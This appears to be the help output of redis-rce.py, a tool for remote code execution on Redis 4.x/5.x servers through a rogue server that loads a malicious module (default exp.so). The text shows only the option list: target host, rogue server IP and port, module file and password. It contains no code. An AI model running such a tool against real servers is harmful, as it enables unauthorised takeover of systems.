
```bash
usage: redis-rce.py [-h] -r RHOST [-p RPORT] -L LHOST [-P LPORT] [-f FILE]
                    [-a AUTH] [-v]

Redis 4.x/5.x RCE with RedisModules

optional arguments:
  -h, --help            show this help message and exit
  -r RHOST, --rhost RHOST
                        target host
  -p RPORT, --rport RPORT
                        target redis port, default 6379
  -L LHOST, --lhost LHOST
                        rogue server ip
  -P LPORT, --lport LPORT
                        rogue server listen port, default 21000
  -f FILE, --file FILE  RedisModules to load, default exp.so
  -a AUTH, --auth AUTH  redis password
  -v, --verbose         show more info
```